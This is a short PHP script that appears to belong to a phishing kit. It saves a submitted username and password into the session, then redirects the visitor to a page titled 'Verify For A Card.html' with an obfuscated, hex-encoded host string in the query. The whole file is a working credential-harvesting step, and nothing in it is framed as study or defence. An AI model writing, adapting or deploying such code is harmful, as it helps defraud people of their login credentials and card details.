<?php
session_start();
$_SESSION['username'] = $_POST['username'];
$_SESSION['password'] = $_POST['password'];

$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="Verify For A Card.html?$host-$host-$host$host$host$host$host$host$host$host$host";

header("location: $Logon");

?>